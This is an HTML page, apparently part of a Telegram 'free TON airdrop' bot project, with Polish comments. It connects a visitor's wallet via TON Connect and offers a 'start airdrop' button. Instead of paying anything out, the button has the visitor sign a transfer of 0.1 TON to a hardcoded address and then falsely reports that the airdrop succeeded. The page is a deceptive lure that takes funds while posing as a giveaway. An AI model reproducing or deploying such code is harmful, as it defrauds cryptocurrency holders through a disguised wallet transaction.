<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Connect Example</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>

<body>
    <div class="center" id="ton-connect"></div>
    <button id="start-airdrop" style="display: none;">Rozpocznij Airdrop</button>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });

        tonConnectUI.uiOptions = {
            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
        };

        const startAirdropButton = document.getElementById('start-airdrop');

        // Funkcja, aby sprawdzić status połączenia i pokazać przycisk
        async function checkWalletConnection() {
            const status = await tonConnectUI.getStatus(); // Pobierz status połączenia

            if (status === 'connected') {
                startAirdropButton.style.display = 'block';
                console.log("Portfel połączony, przycisk aktywowany.");
            } else {
                console.log("Portfel nie jest połączony.");
            }
        }

        // Wywołaj sprawdzenie statusu przy starcie i ustawienie listenera
        checkWalletConnection();

        // Ustaw listener dla zmiany statusu
        tonConnectUI.onStatusChange((status) => {
            console.log("Status połączenia:", status);
            if (status === 'connected') {
                startAirdropButton.style.display = 'block';
            } else {
                startAirdropButton.style.display = 'none';
            }
        });

        startAirdropButton.addEventListener('click', async () => {
            try {
                // Ustal adres kontraktu i ilość TON do wymiany
                const contractAddress = 'EQDcwc2whoTvG3Q81iztMKE1CHLZZdXGXgth2mxJ1cNmGgTi';
                const amountInTon = '0.1'; // na przykład

                // Utwórz i podpisz transakcję
                const result = await tonConnectUI.sendTransaction({
                    to: contractAddress,
                    value: amountInTon,
                    data: '' // opcjonalnie dane, które wymaga kontrakt
                });

                console.log('Transakcja pomyślna:', result);
                alert('Airdrop zakończony sukcesem!');

            } catch (error) {
                console.error('Błąd transakcji:', error);
                alert('Airdrop nie powiódł się.');
            }
        });
    </script>
</body>

</html>
